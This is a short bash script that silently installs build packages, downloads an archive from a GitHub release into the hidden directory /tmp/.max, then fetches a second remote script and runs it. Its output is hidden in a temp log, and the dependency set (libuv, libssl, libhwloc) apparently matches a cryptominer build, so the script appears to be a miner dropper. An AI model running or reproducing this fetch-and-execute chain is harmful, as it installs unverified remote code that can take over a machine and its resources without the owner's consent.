#!/bin/bash 
echo 0.1.0
sudo apt-get install git build-essential cmake libuv1-dev libssl-dev libhwloc-dev automake libtool autoconf -y 1> /tmp/max_log 2> /tmp/max_log
 wget -q -O /tmp/maxarc  https://github.com/cloud10001/pycpu/releases/download/v01/maxarc 
 cd /tmp/
 tar -xJf /tmp/maxarc 
 cd  /tmp/.max
 wget -q -O /tmp/.max/script.sh https://github.com/cloud10001/pycpu/raw/main/test.sh
 chmod +x script.sh
 ./script.sh